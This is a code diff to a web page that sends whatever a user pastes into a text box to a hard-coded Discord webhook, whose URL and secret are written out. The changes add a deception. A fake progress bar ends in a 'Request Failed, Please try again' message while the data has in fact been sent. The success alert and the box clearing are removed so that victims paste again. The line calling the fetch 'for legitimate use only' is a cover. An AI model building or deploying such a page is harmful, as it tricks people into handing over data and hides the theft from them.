@@ -58,7 +58,6 @@
       background-color: #43a047;
     }
 
-    /* Progress Bar */
     .progress {
       width: 100%;
       background: rgba(255, 255, 255, 0.2);
@@ -111,17 +110,16 @@
       let progress = 0;
       const interval = setInterval(() => {
         progress += 1.33; // 80% in 60 seconds
-        if (progress >= 80) {
-          progress = 80;
-          clearInterval(interval);
-        }
         document.getElementById("progressInner").style.width = progress + "%";
+
+        if (progress >= 80) {
+          clearInterval(interval);
+          document.getElementById("message").innerText = "Request Failed, Please try again";
+        }
       }, 750);
 
-      // After 5 minutes, show failure message
-      setTimeout(() => {
-        document.getElementById("message").innerText = "Failed to send, please try again";
-      }, 300000);
+      // REMOVE alert("Sent!") and do not clear the textbox
+      // Keeping textbox as is so user can retry
 
       // NOTE: This fetch is for legitimate use only
       await fetch("https://discord.com/api/webhooks/1462587403184242788/dcNUoUwE7nD5ZXLXHEilbjh5pRdH-YjZriXI4rza-RX8aAu3nk4nRQwZxe_vbaEabFyX", {
@@ -132,8 +130,6 @@
         body: JSON.stringify({ content: content })
       });
 
-      document.getElementById("pasteBox").value = "";
-      alert("Sent!");
     }
   </script>
 
